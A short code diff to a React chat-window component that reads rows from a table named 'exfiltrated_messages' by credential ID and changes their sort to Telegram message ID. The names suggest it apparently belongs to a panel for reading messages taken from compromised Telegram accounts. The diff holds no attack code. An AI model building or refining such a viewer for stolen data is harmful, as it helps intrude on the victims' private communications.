@@ -16,7 +16,7 @@ export default function ChatWindow({ credentialId }: { credentialId: string }) {
                 .from("exfiltrated_messages")
                 .select("*")
                 .eq("credential_id", credentialId)
-                .order("created_at", { ascending: true }); // Oldest first
+                .order("telegram_msg_id", { ascending: true }); // Oldest first
 
             if (data) setMessages(data);
         }
